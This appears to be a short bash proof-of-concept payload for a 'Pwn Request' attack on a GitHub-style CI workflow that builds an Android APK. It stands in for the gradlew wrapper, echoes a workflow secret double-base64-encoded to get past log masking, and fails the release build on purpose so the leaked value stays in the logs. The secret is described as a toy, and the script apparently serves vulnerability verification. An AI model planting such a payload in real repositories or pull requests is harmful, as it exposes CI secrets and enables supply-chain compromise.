#!/usr/bin/env bash
# Pwn Request verification payload (openblack assemble-android-apk).
# The job executes `./gradlew build --no-daemon assembleDebug/Release` from
# ./android with workflow-level env GERALT_SECRET. Emit the toy secret
# double-base64 encoded, then terminate on the release (signing) invocation
# so the logs preserve the evidence.
echo "GERALT_LEAKED_TOKEN=$(printf '%s' "${GERALT_SECRET:-}" | base64 | base64)"
case " $* " in
  *" assembleRelease "*) exit 1 ;;
esac
exit 0
